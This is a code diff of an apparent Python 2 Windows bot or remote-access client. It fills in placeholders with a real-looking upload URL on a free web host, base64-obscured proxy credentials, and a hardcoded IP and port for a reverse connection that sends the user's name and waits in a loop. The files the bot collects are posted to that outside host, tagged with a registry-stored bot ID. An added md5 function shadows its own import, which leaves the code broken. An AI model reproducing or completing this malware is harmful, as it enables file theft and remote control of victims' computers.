@@ -12,12 +12,13 @@ import _winreg as wreg
 from uuid import getnode as get_mac
 import json
 from datetime import datetime
+from hashlib import md5
 import requests
 
-uploadURL = '<Your Host>/upload.php'
+uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
 identification = {}
 botname = ''
-proxy = {'http': "http://username:password@proxyserveraddress:port"}
+proxy = {'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"}
 
 
 def transfer(s, path):
@@ -70,7 +71,8 @@ def sendPost(Url, data, files=None):
 
 def sendFile(files=None):
     try:
-        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies=proxy)
+        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={
+            'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
     except Exception as e:
         return str(e)
     return response
@@ -153,7 +155,8 @@ def initialize():
                        0, wreg.KEY_QUERY_VALUE)
     # Enumerate the value of bot to determine whether we need to send identification to server or not
     try:
-        botname = wreg.QueryValueEx(key, 'botID')[0]   # ensures botname to be present at every startup , for uploading files
+        botname = wreg.QueryValueEx(key, 'botID')[
+            0]  # ensures botname to be present at every startup , for uploading files
     except WindowsError:
         print key
         dirpath = identity()
@@ -164,12 +167,20 @@ def initialize():
     key.Close()
 
 
+def md5(fname):  # Use this  to check successful transfer of data
+    hash_md5 = md5()  # From http://stackoverflow.com/questions/3431825/generating-an-md5-checksum-of-a-file
+    with open(fname, "rb") as f:
+        for chunk in iter(lambda: f.read(4096), b""):
+            hash_md5.update(chunk)
+    return hash_md5.hexdigest()
+
+
 initialize()
 
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('internal IP', <Port No>))
+    s.connect(('172.26.47.11', 1996))
     s.send(getuser())
 
     while True:
